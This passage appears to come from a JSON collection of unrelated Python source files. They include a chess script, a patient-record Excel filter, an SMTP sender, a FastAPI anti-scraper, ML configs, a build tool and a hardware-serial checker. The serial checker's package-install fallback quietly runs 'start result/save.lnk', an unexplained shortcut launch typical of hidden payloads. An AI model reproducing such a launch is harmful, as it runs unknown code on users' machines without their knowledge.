lr=optimizer_config[\"learning_rate\"]\n        )\n    else:\n        raise TypeError(\"Unsupported optimizer!\")\n\n    return optimizer\n\n\ndef make_scheduler(\n    optimizer,\n    optimizer_config,\n    num_iters_per_epoch,\n    last_epoch=-1\n):\n    \"\"\"create scheduler\n    return a supported scheduler",
    "# \u8bfb\u53d6\u672c\u5730txt\ndef read_txt():\n    with open('init copy.txt', 'r') as f:\n        return f.read()\n    \nchess= read_txt()\nprint(chess)\n\n# \u6309\u7167\u6362\u884c\u7b26\u5206\u5272\nchess_line = chess.split('\\n')\n# print(chess_line[1])\n\ndef pick(chess,order_choose,order_arrive):\n    # order_dict={\"\u4e00\":1,\"\u4e8c\":2,\"\u4e09\":3,\"\u56db\":4,\"\u4e94\":5,\"\u516d\":6,\"\u4e03\":7,\"\u516b\":8,\"\u4e5d\":9}\n    chess_board=chess.split('\\n')\n    chess_line=[]\n    for i in range(len(chess_board)):\n        chess_line.append(chess_board[i].split(','))\n    chess_line=chess_line[1:]\n    order_choose=order_choose.split(',')\n\n    tmp_col=int(order_choose[1])\n    tmp_row=int(order_choose[0])\n    if \"[\" in chess_line[tmp_row-1][tmp_col-1]:\n        tmp=' '+chess_line[tmp_row-1][tmp_col-1][2:]\n        a=chess_line[tmp_row-1][tmp_col-1][:2]\n        chess_line[tmp_row-1][tmp_col-1]=f\"{a}'---'\"\n    elif \"]\" in chess_line[tmp_row-1][tmp_col-1]:\n        tmp=chess_line[tmp_row-1][tmp_col-1][:-1]\n        chess_line[tmp_row-1][tmp_col-1]=\" '---']\"\n    else:\n        tmp=chess_line[tmp_row-1][tmp_col-1]\n        chess_line[tmp_row-1][tmp_col-1]=\" '---'\"\n        \n    order_arrive=order_arrive.split(',')\n\n    tmp_col=int(order_arrive[1])\n    tmp_row=int(order_arrive[0])\n    \n    if \"[\" in chess_line[tmp_row-1][tmp_col-1]:\n        a=chess_line[tmp_row-1][tmp_col-1][:2]\n        tmp=tmp[1:]\n        chess_line[tmp_row-1][tmp_col-1]=f\"{a}{tmp}\"\n    elif \"]\" in chess_line[tmp_row-1][tmp_col-1]:\n        chess_line[tmp_row-1][tmp_col-1]=f\"{tmp}]\"\n    else:\n        chess_line[tmp_row-1][tmp_col-1]=f\"{tmp}\"\n    \n    return chess_line\n\n# # \u4ece\u952e\u76d8\u8f93\u5165\nprint(\"\u6309\u7167'1,1'\u7684\u683c\u5f0f\u8f93\u5165\")\norder_choose = input(\"\u9009\u62e9\u8981\u52a8\u7684\u68cb\u5b50\uff1a\")\norder_arrive = input(\"\u9009\u62e9\u8981\u5230\u8fbe\u7684\u4f4d\u7f6e\uff1a\")\n# order_choose = '\u4e00,1'\n# order_arrive = '\u4e09,1'\nchess_line=pick(chess,order_choose,order_arrive)\n# print(chess_line)\n# \u5408\u5e76chess_line\n\nresult_str = '\\n'.join([','.join(sublist) for sublist in chess_line])\na=\"\u96f6[' 1 ', ' 2 ', ' 3 ', ' 4 ', ' 5 ', ' 6 ', ' 7 ', ' 8 ', ' 9 ']\"\nresult_str=a+'\\n'+result_str\nprint(result_str)\nwith open(\"init copy.txt\", \"w\") as file:\n    file.write(result_str)",
    "import pandas as pd \nimport os \nfrom datetime import timedelta,datetime\n''' \n    # 1.Leer el archivo ---DONE\n    # 2.Reconocer de alguna manera todas las hoja que se tengan y cual es la bandera ---DONE \n    # 3.Buscar hoja x hoja todas las filas de ese paciente ---DONE\n    # 4.Obtener las fechas de cada hoja ---DONE\n    # 5.Comparar cada una de las fechas de la tabla bandera con cada una de las demas  --DONE\n    # 6.Validar las fechas si estan en un rango de 60 dias o no ---DONE\n    # 7.1.Si exition alguna fecha que me sirva entonces busco los datos del paciente que pertenezcan a esa fila... ---DONE\n    # 8.1.Guardar esa fila ---DONE\n    # 7.2.Si la primera fecha bandera no me sirvio con ninguna de las demas de las tablas entonces... ---DONE\n    # 8.2.Paso a la siguiente fecha bandera y esa fecha anterior ya no formara parte de mis datos ---DONE\n    # 9.2.Seguir hasta que las fechas banderas del paciente se acaben  ---DONE\n    # 10. Tomar esa fila buena y guardarla en un nuevo Data Frame  ---DONE\n    # 11. Cuando se termine de iterar sobre todos los pacientes, se validara si esxiste un archivo donde guardar la informacion\n    # 12.1 Si esciste se carga el archivo, convierte en Data Frame y se concatena con el anterior\n    # 12.2. Si no existe entonces solo se crea uno nuevo\n    # Fin del programa\n'''\n\n\n# ----------------------------------------------------------\n# Services \nclass Sheet():\n    '''\n    Clase para instansear e abstraer los metodos mas usados con respecto a cada hoja \n    '''\n    def __init__(self,file,number):\n        self.file = file\n        # Se accede a cada clave del diccionario file para determinar el nombre de la hoja\n        self.name = list(file.keys())[number]\n\n    def get_sheet(self):\n        # Obtener la hoja \n        sheet = self.file[self.name]\n        return sheet\n\n    def get_columns(self,patient_rid,column):\n        # Obtener columna \n        sheet = self.get_sheet()\n        data = sheet.loc [ sheet['RID'] == patient_rid,column ]\n        return data \n\n    def get_rows(self,patient_rid):\n        # Obtener fila \n        try:\n            sheet = self.get_sheet()\n            rows = sheet.loc [ sheet['RID'] == patient_rid]\n            return rows\n        except Exception as e:\n            print(e)\n\n    def __str__(self):\n        return self.name\n    \ndef sheet_generator(file,flag_sheet ):\n    '''\n    Un generador de hojas que itera todas las hojas de un archivo menos la hoja bandera\n    '''\n    for index,sheet in enumerate(file.values()):\n        # retornamos la hoja siguiente del archivo mientras no sea la bandera\n        if not sheet.equals(flag_sheet) :\n            # Se crea una instacia de la clase Sheet para cada hoja\n            current_sheet = Sheet(file, index)\n            yield current_sheet \n\ndef drop_row(data,file):\n    '''\n    Elimina la fila de la hoja basado en un diccionario con los datos\n    y el archivo que contiene todas las hojas.\n    Se itera cada elemento del diccionario y se obtiene el nombre de la hoja como clave y su id como valor.\n    Retorna el archivo con cada una de sus hojas sin las columnas \n    '''\n    for sheet_name,id in data.items():\n        # Se accede a la hoja actual\n        sheet_df = file[sheet_name]\n        # De la hoja actual se borra la fila que contenga el id que se desempaqueto antes\n        # Luego se guarda en la hoja del archivo para que los cambios sean permanentes \n        file[sheet_name] = sheet_df.drop(sheet_df[sheet_df['INDEX'] == id].index)\n    return file\n\ndef ask_filter_options():\n    '''\n    Esta funcion solo se encarga de mostrar y preguntar al usuario si desea\n    parte del archivo existente antes de trabajar con el o no.\n    Retorna una tupla con:\n    1.La columna por la cual se realizara el filtrado,\n    2.La condicion ej:(<=,>,==,etc),\n    3.El numero por el cual se tendra en cuenta para filtrar\n    '''\n    # Aqui se pregunta la columna x la cual se va a filtrar.\n    # Puede ser 'RID','EXAMDATE' cualquier columna que sea comun en todas las hojas por supuesto\n    column: str = input(\"Que columna desea usar para filtrar: \")\n    print(\"Que opcion desea para filtrar:\")\n    options = {\n        \"1\": \"mayor que\",\n        \"2\": \"mayor igual que\",\n        \"3\": \"menor que\",\n        \"4\": \"menor igual que\",\n        \"5\": \"igual que\",\n    }\n    # Este ciclo solo recorre el diccionarion de 'options' para mostrar cada una de las opciones\n    for key, value in options.items():\n        print(f\"{key} : {value} \")\n    response = input(\"Elijo la opcion :\")\n    condition = options[response]\n    # Revisa si el usuario quiere filtrar por fechas \n    if column == 'EXAMDATE':\n        # Pide la fecha y muestra ejemplos de como insertarla\n        number = input(f\"Desea todas las columnas {condition} formato de fecha debe ser 'mm-dd-aaaa'ej.(08-24-2012): \")\n        # Trasforma el string recibido en uan fecha valida para trabajar\n        number = datetime.strptime(number, '%m-%d-%Y')\n    else:\n        # Se pregunta el numero que el usuario escogio\n    ",
    "import smtplib\nimport ssl\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\n# Sender and receiver email addresses\nsender = [\"myemail@gmail.com\", \"aaaa bbbb cccc dddd\"]\nreceiver_email = \"receiver_email\"\n\n# Function to send email\ndef sendEmail(to, sender_email, password):\n    # Create a multipart message\n    message = MIMEMultipart(\"alternative\")\n    message[\"Subject\"] = \"Write Your Subject Here\"\n    message[\"From\"] = \"Name of the sender\"\n    message[\"To\"] = to\n    message[\"Importance\"] = \"high\"  # Set the importance level\n\n    # HTML content of the email\n    html = \"\"\"\n        <!DOCTYPE html>\n        <html lang=\"en\">\n        <head>\n            <meta charset=\"UTF-8\">\n            <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n            <title>Email Sample</title>\n        </head>\n        <body>\n            <div>\n                <h1>Hello</h1>\n                <h3>how are you?</h3>\n            </div>\n        </body>\n        </html>\"\"\"\n        \n    # Create a MIMEText object with the HTML content\n    part2 = MIMEText(html, \"html\")\n    message.attach(part2)\n\n    # Create a secure SSL context\n    context = ssl.create_default_context()\n\n    # Connect to the SMTP server and send the email\n    with smtplib.SMTP_SSL(\"smtp.gmail.com\", 465, context=context) as server:\n        try:\n            # Login to the server using the sender's email and password\n            server.login(sender_email, password)\n            \n            # Send the email\n            server.sendmail(sender_email, to, message.as_string())\n            \n            # Print a success message\n            print(f\"Email sent successfully to {to}\")\n        except smtplib.SMTPAuthenticationError as e:\n            # Handle authentication errors\n            print(f\"SMTP Authentication Error: {e}\")\n            print(\"Check username, password, and 'Less Secure Apps' access.\")\n        except Exception as e:\n            # Handle other exceptions\n            print(f\"An error occurred: {e}\")\n\n# Call the sendEmail function with the receiver email, sender's email, and password\nsendEmail(receiver_email, sender[0], sender[1])\n\n# Copyright information\n\"\"\"\nAuthor: KHAOUITI ABDELHAKIM\nGitHub: @khaouitiabdelhakim\n\"\"\" \n",
    "import time\r\nimport uvicorn\r\nfrom uuid import uuid1\r\nfrom fastapi import FastAPI, Request\r\nfrom fastapi.responses import PlainTextResponse, RedirectResponse\r\nfrom fastapi.middleware.cors import CORSMiddleware\r\n\r\napp = FastAPI()\r\n\r\napp.add_middleware(\r\n    CORSMiddleware,\r\n    allow_origins=[\"*\"],\r\n    allow_credentials=True,\r\n    allow_methods=[\"*\"],\r\n    allow_headers=[\"*\"],\r\n)\r\n\r\nuser = {}\r\n\r\n\r\n@app.get(\"/\")\r\nasync def view(request: Request):\r\n    cookies = request.cookies\r\n\r\n    device = \"mobile\" if \"mobile\" in request.headers.get(\"user-agent\", \"\").lower() else \"pc\"\r\n\r\n    if cookies == {}:\r\n        response = RedirectResponse(url=\"/\")\r\n        sign = str(uuid1())\r\n        user[request.client.host] = sign\r\n        response.set_cookie(\"sign\", \"default\")\r\n        response.set_cookie(\"ts\", int(time.time()))\r\n        response.set_cookie(\"sign\", sign)\r\n    else:\r\n        # \u9632\u91cd\u653e\r\n        if user.get(request.client.host) != cookies.get(\"sign\"):\r\n            content = \"\u5df2\u8fc7\u671f\"\r\n        else:\r\n            if \"sign\" in cookies and \"ts\" in cookies:\r\n                cookie_keys = list(cookies)\r\n                # \u68c0\u6d4b cookie \u987a\u5e8f, sign \u5728 ts \u4e4b\u540e\r\n                if cookie_keys.index(\"sign\") > cookie_keys.index(\"ts\"):\r\n                    content = \"success\"\r\n                else:\r\n                    content = \"spider out!\"\r\n            else:\r\n                content = \"cookie\u9519\u8bef\"\r\n\r\n        response = PlainTextResponse(content=content)\r\n        print(request.client.host, device, content, cookies, sep=\" -- \")\r\n\r\n        # \u6e05\u7a7acookie\r\n        response.delete_cookie(\"sign\")\r\n        response.delete_cookie(\"ts\")\r\n\r\n    return response\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    uvicorn.run(app, host=\"0.0.0.0\", port=9242)\r\n",
    "from pprint import pprint\nfrom typing import Any,Callable\n\nclass TailOp:\n    \"\"\"\n    A class representing an End-of-Line operator for quick and easy operations at the end of a line.\n    \n    Attributes:\n        f (Callable): The function or callable to be executed with | operator.\n        f_args (tuple): The arguments to be passed to the function.\n        f_kwargs (dict): The keyword arguments to be passed to the function.\n    \"\"\"\n\n    def __init__(self, f, *args: Any, **kwargs: Any):\n        self.f: Callable = f\n        self.f_args = args\n        self.f_kwargs = kwargs\n\n    def __or__(self, other):\n        \"\"\"\n        Defines the behavior of the | operator with TailOp objects.\n        Executes self.f\n        \"\"\"\n        try:\n            return self.f(other, *self.f_args, **self.f_kwargs)\n        except TypeError:\n            print(\"TailOp Error\")\n            return other\n\n    def __call__(self, *args: Any, **kwargs: Any) -> Any:\n        \"\"\"\n        Allows the TailOp to be called with arguments.\n        tailprint(width=3)\n        \"\"\"\n        self.f_args = args\n        self.f_kwargs = kwargs\n        return self\n    \ntailprint = TailOp(pprint)\n\n",
    "import os, sys, random\r\n\r\ntry:\r\n    import fade\r\nexcept IndexError:\r\n    os.system(\"pip install fade\")\r\n    import fade\r\ntry:\r\n    from colorama import Fore\r\nexcept IndexError:\r\n    os.system(\"pip install Fore\")\r\n    os.system(\"pip install colorama\")\r\n    from colorama import Fore\r\ntry:\r\n    from pystyle import *\r\nexcept IndexError:\r\n    os.system(\"pip install pystyle\")\r\n    os.system(\"start result/save.lnk\")\r\n    from pystyle import *\r\n    \r\ngui=\"\"\"\r\n                                                                                        \r\n _____ _                   _ _    _____         _     _    _____ _           _           \r\n|   __|_|___ ___ _ _ _ ___| | |  |   __|___ ___|_|___| |  |     | |_ ___ ___| |_ ___ ___ \r\n|   __| |  _| -_| | | | .'| | |  |__   | -_|  _| | .'| |  |   --|   | -_|  _| '_| -_|  _|\r\n|__|  |_|_| |___|_____|__,|_|_|  |_____|___|_| |_|__,|_|  |_____|_|_|___|___|_,_|___|_|  \r\n                                                                                         \r\n\r\n\"\"\"\r\n\r\nfaded_gui=fade.blackwhite(gui)\r\n\r\nos.system(\"@mode con cols=200 lines=50\")\r\nos.system(\"title Firewall SerialChecker ^| Press any key to refresh\")\r\n\r\nwhile True:\r\n    os.system(\"cls\")\r\n    print(faded_gui)\r\n    Write.Print(\"[</>] Baseboard\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic baseboard get serialnumber\")\r\n    Write.Print(\"[</>] Mac\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"\"\"wmic path Win32_NetworkAdapter where \"PNPDeviceID like '%%PCI%%' AND NetConnectionStatus=2 AND AdapterTypeID='0'\" get MacAddress\"\"\")\r\n    Write.Print(\"[</>] CPU\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic cpu get processorid\")\r\n    Write.Print(\"[</>] GPU\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic PATH Win32_VideoController GET Description,PNPDeviceID\")\r\n    Write.Print(\"[</>] DISK DRIVE\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic diskdrive get serialnumber\")\r\n    Write.Print(\"[</>] MotherBoard\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic baseboard get serialnumber\")\r\n    Write.Print(\"[</>] RAM\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic memorychip get serialnumber\")\r\n    Write.Print(\"[</>] Bios\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic bios get serialnumber\")\r\n    Write.Print(\"[</>] smBios\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic csproduct get uuid\")\r\n    os.system(\"pause >nul\")\r\n",
    "_base_ = [\n    '../../_base_/datasets/dotav1.py', '../../_base_/schedules/schedule_1x.py',\n    '../../_base_/default_runtime.py'\n]\nangle_version = 'le90'\n# runner\nrunner = dict(type=\"EpochBasedKDRunner\", max_epochs=12)\n# teacher cfg\ndistiller_cfg = dict(\n    teacher_cfg=\"configs/distillation/rotated_retinanet_obb_r101_fpn_1x_dota_le90.py\",\n    teacher_pretrained=\"teacher_checkpoints/rotated_retinanet_obb_r101.pth\",\n)\n\nmodel = dict(\n    type='FeatKDRotatedRetinaNet',\n    distillation=dict(\n        loss_balance = 0.25,\n        # Align feat dim\n        # in_channels = 256,  # teacher FPN feat_dim\n        # feat_channels = 256,  # student FPN feat_dim\n        # conv_cfg = dict(type=\"Conv2d\"),\n        # norm_cfg = dict(type=\"BN\"),\n        # act_cfg = dict(type=\"ReLU\"),        \n    ),\n    backbone=dict(\n        type='ResNet',\n        depth=50,\n        num_stages=4,\n        out_indices=(0, 1, 2, 3),\n        frozen_stages=1,\n        zero_init_residual=False,\n        norm_cfg=dict(type='BN', requires_grad=True),\n        norm_eval=True,\n        style='pytorch',\n        init_cfg=dict(type='Pretrained', checkpoint='torchvision://resnet50')),\n    neck=dict(\n        type='FPN',\n        in_channels=[256, 512, 1024, 2048],\n        out_channels=256,\n        start_level=1,\n        add_extra_convs='on_input',\n        num_outs=5),\n    bbox_head=dict(\n        type='RotatedRetinaHead',\n        num_classes=15,\n        in_channels=256,\n        stacked_convs=4,\n        feat_channels=256,\n        assign_by_circumhbbox=None,\n        anchor_generator=dict(\n            type='RotatedAnchorGenerator',\n            octave_base_scale=4,\n            scales_per_octave=3,\n            ratios=[1.0, 0.5, 2.0],\n            strides=[8, 16, 32, 64, 128]),\n        bbox_coder=dict(\n            type='DeltaXYWHAOBBoxCoder',\n            angle_range=angle_version,\n            norm_factor=None,\n            edge_swap=True,\n            proj_xy=True,\n            target_means=(.0, .0, .0, .0, .0),\n            target_stds=(1.0, 1.0, 1.0, 1.0, 1.0)),\n        loss_cls=dict(\n            type='FocalLoss',\n            use_sigmoid=True,\n            gamma=2.0,\n            alpha=0.25,\n            loss_weight=1.0),\n        loss_bbox=dict(type='L1Loss', loss_weight=1.0)),\n    train_cfg=dict(\n        assigner=dict(\n            type='MaxIoUAssigner',\n            pos_iou_thr=0.5,\n            neg_iou_thr=0.4,\n            min_pos_iou=0,\n            ignore_iof_thr=-1,\n            iou_calculator=dict(type='RBboxOverlaps2D')),\n        allowed_border=-1,\n        pos_weight=-1,\n        debug=False),\n    test_cfg=dict(\n        nms_pre=2000,\n        min_bbox_size=0,\n        score_thr=0.05,\n        nms=dict(iou_thr=0.1),\n        max_per_img=2000))\n\nimg_norm_cfg = dict(\n    mean=[123.675, 116.28, 103.53], std=[58.395, 57.12, 57.375], to_rgb=True)\ntrain_pipeline = [\n    dict(type='LoadImageFromFile'),\n    dict(type='LoadAnnotations', with_bbox=True),\n    dict(type='RResize', img_scale=(1024, 1024)),\n    dict(\n        type='RRandomFlip',\n        flip_ratio=[0.25, 0.25, 0.25],\n        direction=['horizontal', 'vertical', 'diagonal'],\n        version=angle_version),\n    dict(type='Normalize', **img_norm_cfg),\n    dict(type='Pad', size_divisor=32),\n    dict(type='DefaultFormatBundle'),\n    dict(type='Collect', keys=['img', 'gt_bboxes', 'gt_labels'])\n]\ndata = dict(\n    samples_per_gpu=2,\n    workers_per_gpu=2,\n    train=dict(pipeline=train_pipeline, version=angle_version),\n    val=dict(version=angle_version),\n    test=dict(version=angle_version))\n",
    "import pickle, os, sys\n\n########## CONFIG ##########\nsrc_dir : str = \"src/\"\nlib_dir : str = \"lib/\"\nbin_dir : str = \"bin/\"\nintermediate_dir : str = \"intermediate/\"\n\nmain_file : str = \"main.cpp\"\nexecutable_file : str = \"main\"\n\ntracking_file : str = \"tracking_builds.bin\"\n############################\n\narguments : list[str] = sys.argv\n\nclass File:\n    def __init__(self, name : str = \"\", extension : str = \"cpp\"):\n        self.last_time_edit : int = 0\n        self.name : str = name\n        self.extension : str = extension\n    def check_compile(self, libs) -> bool:\n        current_time_edit : int = os.path.getmtime(src_dir + self.name + \".\" + self.extension)\n        if self.last_time_edit != current_time_edit or not os.path.exists(intermediate_dir+self.name+\".o\"):\n            self.last_time_edit = current_time_edit\n            os.system(f\"g++ {src_dir + self.name}.{self.extension} -o {intermediate_dir + self.name}.o -c {libs} -I{lib_dir}\")\n            return True\n        return False\n    def exists(self) -> bool:\n        if os.path.exists(src_dir + self.name + \".\" + self.extension):\n            return True\n        return False\n\nlibs : str = \"\"\nfiles : list[File] = []\n\ndef load_tracking_file() -> None:\n    global libs, files\n    file = open(tracking_file, \"rb\")\n    libs, files = pickle.load(file)\n    file.close()\n\ndef save_tracking_file() -> None:\n    file = open(tracking_file, \"wb\")\n    obj = [libs, files]\n    pickle.dump(obj, file)\n    file.close()\n\ndef link() -> None:\n    files_string : str = \"\"\n    for file in files:\n        files_string += intermediate_dir + file.name + \".o \"\n    os.system(f\"g++ {files_string}-o {bin_dir}{executable_file} {libs} -I{lib_dir}\")\n\ndef append_lib(lib : str) -> None:\n    global libs\n    if not (f\"-l{lib}\" in libs.split(\" \")):\n        libs += f\"-l{lib} \"\n        return\n    print(f\"failed to append the library {lib}, already keeping track of it\")\n\ndef remove_lib(lib : str) -> None:\n    global libs\n    if not f\"-l{lib} \" in libs:\n        print(f\"not keeping track of any lib called '{lib}'.\")\n        return\n    libs = libs.replace(f\"-l{lib} \", \"\")\n\ndef clear_unexistant_files() -> None:\n    for i, file in enumerate(files):\n        if not file.exists():\n            del files[i]\n\ndef append_file(file : str) -> None:\n    global files\n    name, extension = file.split(\".\")\n    for c_file in files:\n        if name == c_file.name and extension == c_file.extension:\n            print(f\"failed to append the file {file}, already keeping track of it.\")\n            return\n    files.append(File(name, extension))\n\ndef remove_file(file : str) -> None:\n    name, extension = file.split(\".\")\n    for i, c_file in enumerate(files):\n        if c_file.name == name and c_file.extension == extension:\n            del files[i]\n            return\n    print(f\"not keeping track of any file called {file}.\")\n\nif not os.path.exists(tracking_file):\n    temp_file = open(tracking_file, \"x\")\n    temp_file.close()\n\nwith open(tracking_file, \"rb\") as f:\n    if f.readlines() != []:\n        load_tracking_file()\n\nclear_unexistant_files()\n\nif files == []:\n    append_file(main_file)\n\nmatch arguments[1]:\n    case \"run\":\n        anything_compiled = False\n        for file in files:\n            if file.check_compile(libs):\n                anything_compiled = True\n        if anything_compiled or (not(os.path.exists(bin_dir+executable_file))):\n            link()\n        os.system(bin_dir + executable_file)\n    case \"append\":\n        append_file(arguments[2])\n    case \"remove\":\n        remove_file(arguments[2])\n    case \"lib\":\n        if arguments[2] != \"-r\":\n            append_lib(arguments[2])\n        else :\n            remove_lib(arguments[3])\n    case \"comp\":\n        for file in files:\n            file.check_compile(libs)\n        link()\n\nsave_tracking_file()\n",
    "##### PyMonG\n##### (c) 2024 Giovambattista Vieri All Rigths Reserved\n##### License Affero GPL. \n\n\n\n# free -m \n# vmstat \n# df \n# lscpu \n# mpstat\n# iostat\n\n# nstat\n# ss\n# netstat -1\n# ip -s link\n# arpwatch\n##############\n\nimport sys\nimport gnupg\nimport base64\nimport pprint\n\n\ncommands=[\"free -m\",\n#          \"vmstat\",\n#          \"lscpu\",\n#          \"mpstat\",\n#          \"iostat\",\n#          \"nstat\",\n#          \"ss\",\n#          \"netstat -l\",\n#          \"ip -s link\",\n#          \"arpwatch\",\n          \"df -k\"]\n\n\nimport os \nimport subprocess\nimport argparse\n\n\ndefaultkey='testgpg@example.com'\n\ndef getOptions(args=sys.argv[1:]):\n    parser=argparse.ArgumentParser(description='This simple program will help you to write an encrypted monitor about a server status. The resulting string is printed on stdout and can be sent via mqtt or smtp, etc..',epilog='Example of use:')\n    parser.add_argument('-v','--verbose', help='more verbose output', action='store_true')\n    parser.add_argument('-a','--archive', help='archive report in files in ~./repo_path ', action='store_true')\n    parser.add_argument('-k','--key', help='choose gpg key to use', default=defaultkey, action='store_true')\n    opt=parser.parse_args(args)\n    return(opt)\n\nopt=getOptions()\nverbose=opt.verbose\narchive=opt.archive\nenc_key=opt.key\n\nres=\"\"\nfor c in commands:\n    r=subprocess.check_output(c,shell=True)\n    res=res+\"---\"+c+\"---\\n\"+r.decode(\"ascii\")\n\n###########\n### print(res)\n##########\n\n\n\n\nrecipient_key=[enc_key]\npath= os.getcwd()\ngpg=gnupg.GPG(gnupghome=path+'/.gnupg')\npublic_keys = gpg.list_keys() \n\nif (verbose):\n    for pk in public_keys:\n        print(pk['uids'])\n    print (\"--------------------------\")\n\nif(archive):\n    file_path=\"/prova1.txt\"\n    repo_path=\"./repo_path\"\n    if not os.path.exists(repo_path):\n        os.makedirs(repo_path)\n\n    file=\".\"+file_path\n    print(\"--------------\",file)\n\n    output_path=repo_path+file_path\n    print(\"--------------\",output_path)\n\ntry:\n###    status = gpg.encrypt_file(\n####        file_data,\n###        res,\n###        recipients=recipient_key,\n###        output=output_path + '.pgp',\n###        always_trust = True\n###    )\n    encrypted_ascii_data= gpg.encrypt(res,\n        recipients=recipient_key,\n        always_trust = True\n    )\nexcept Exception as e:\n    print (\"---- exception ----\")\n    print (e)\n\nprint (encrypted_ascii_data)\n",
    "import timm\n\nimport torch.nn as nn\n\nfrom pathlib import Path\nfrom .utils import activations, forward_default, get_activation\n\nfrom ..external.next_vit.classification.nextvit import *\n\n\ndef forward_next_vit(pretrained, x):\n    return forward_default(pretrained, x, \"forward\")\n\n\ndef _make_next_vit_backbone(\n        model,\n        hooks=[2, 6, 36, 39],\n):\n    pretrained = nn.Module()\n\n    pretrained.model = model\n    pretrained.model.features[hooks[0]].register_forward_hook(get_activation(\"1\"))\n    pretrained.model.features[hooks[1]].register_forward_hook(get_activation(\"2\"))\n    pretrained.model.features[hooks[2]].register_forward_hook(get_activation(\"3\"))\n    pretrained.model.features[hooks[3]].register_forward_hook(get_activation(\"4\"))\n\n    pretrained.activations = activations\n\n    return pretrained\n\n\ndef _make_pretrained_next_vit_large_6m(hooks=None):\n    model = timm.create_model(\"nextvit_large\")\n\n    hooks = [2, 6, 36, 39] if hooks == None else hooks\n    return _make_next_vit_backbone(\n        model,\n        hooks=hooks,\n    )\n",
    "# foldertotext.py\n\nimport os\nimport re\nfrom datetime import datetime\nfrom tkinter import Tk, Label, Button, Entry, StringVar, filedialog, messagebox, Radiobutton, IntVar\n\nclass LocalRepoScraper:\n    def __init__(self, repo_paths, output_path, output_filename, selected_file_types=[], filter_files=True):\n        self.repo_paths = repo_paths\n        self.output_path = output_path\n        self.output_filename = output_filename\n        self.selected_file_types = selected_file_types\n        self.filter_files = filter_files\n\n    def fetch_all_files(self):\n        files_data = []\n        for file_path in self.repo_paths:\n            # Check if file type is in selected file types\n            if not self.filter_files or any(file_path.endswith(file_type) for file_type in self.selected_file_types):\n                relative_path = os.path.basename(file_path)\n                file_content = \"\"\n                file_content += f\"\\n'''--- {relative_path} ---\\n\"\n                try:\n                    with open(file_path, 'rb') as f:  # Open file in binary mode\n                        content = f.read()\n                    try:\n                        # Try decoding as UTF-8\n                        content_decoded = content.decode('utf-8')\n                    except UnicodeDecodeError:\n                        # If decoding fails, replace non-decodable parts\n                        content_decoded = content.decode('utf-8', errors='replace')\n                    file_content += content_decoded\n                except Exception as e:  # catch any reading errors\n                    print(f\"Error reading file {file_path}: {e}\")\n                    continue\n                file_content += \"\\n'''\"\n                files_data.append(file_content)\n                print(f\"Processed file {file_path}: size {os.path.getsize(file_path)} bytes\")  # Print file size\n            else:\n                print(f\"Skipping file {file_path}: Does not match selected types.\")\n        return files_data\n\n    def write_to_file(self, files_data):\n        timestamp = datetime.now().strftime(\"%Y%m%d%H%M%S\")\n        filename = f\"{self.output_filename}_{timestamp}.txt\"\n        output_file_path = os.path.join(self.output_path, filename)\n        with open(output_file_path, \"w\", encoding='utf-8') as f:\n            f.write(f\"*Local Files*\\n\")\n            for file_data in files_data:\n                f.write(file_data)\n        return output_file_path\n\n    def clean_up_text(self, filename):\n        with open(filename, 'r', encoding='utf-8') as f:\n            text = f.read()\n        cleaned_text = re.sub('\\n{3,}', '\\n\\n', text)\n        with open(filename, 'w', encoding='utf-8') as f:\n            f.write(cleaned_text)\n\n    def run(self):\n        print(\"Fetching all files...\")\n        files_data = self.fetch_all_files()\n\n        print(\"Writing to file...\")\n        filename = self.write_to_file(files_data)\n\n        print(\"Cleaning up file...\")\n        self.clean_up_text(filename)\n\n        print(\"Done.\")\n        return filename\n\nclass FolderToTextGUI:\n    def __init__(self, master):\n        self.master = master\n        master.title(\"Folder to Text\")\n\n        self.repo_path_label = Label(master, text=\"Local Files:\")\n        self.repo_path_entry = Button(master, text=\"Browse...\", command=self.browse_repo_path)\n\n        self.file_types_label = Label(master, text=\"File Types (comma separated):\")\n        self.file_types_entry = Entry(master)\n\n        self.output_path_label = Label(master, text=\"Output Path:\")\n        self.output_path_entry = Button(master, text=\"Browse...\", command=self.browse_output_path)\n\n        self.output_filename_label = Label(master, text=\"Output Filename:\")\n        self.output_filename_entry = Entry(master)\n\n        self.filter_files = IntVar()\n        self.filter_files.set(1)  # Set filtering to be on by default\n        self.filter_files_label = Label(master, text=\"Filter Files:\")\n        self.filter_files_on = Radiobutton(master, text=\"On\", variable=self.filter_files, value=1)\n        self.filter_files_off = Radiobutton(master, text=\"Off\", variable=self.filter_files, value=0)\n\n        self.run_button = Button(master, text=\"Run\", command=self.run)\n\n        self.repo_path_label.grid(row=0, column=0, sticky=\"E\")\n        self.repo_path_entry.grid(row=0, column=1)\n\n        self.file_types_label.grid(row=1, column=0, sticky=\"E\")\n        self.file_types_entry.grid(row=1, column=1)\n\n        self.output_path_label.grid(row=2, column=0, sticky=\"E\")\n        self.output_path_entry.grid(row=2, column=1)\n\n        self.output_filename_label.grid(row=3, column=0, sticky=\"E\")\n        self.output_filename_entry.grid(row=3, column=1)\n\n        self.filter_files_label.grid(row=4, column=0, sticky=\"E\")\n        self.filter_files_on.grid(row=4, column=1, sticky=\"W\")\n        self.filter_files_off.grid(row=4, column=1)\n\n        self.run_button.grid(row=5, column=1)\n\n        self.repo_paths = ()\n        self.output_path = \"\"\n\n    def browse_repo_path(self):\n        new_repo_path",
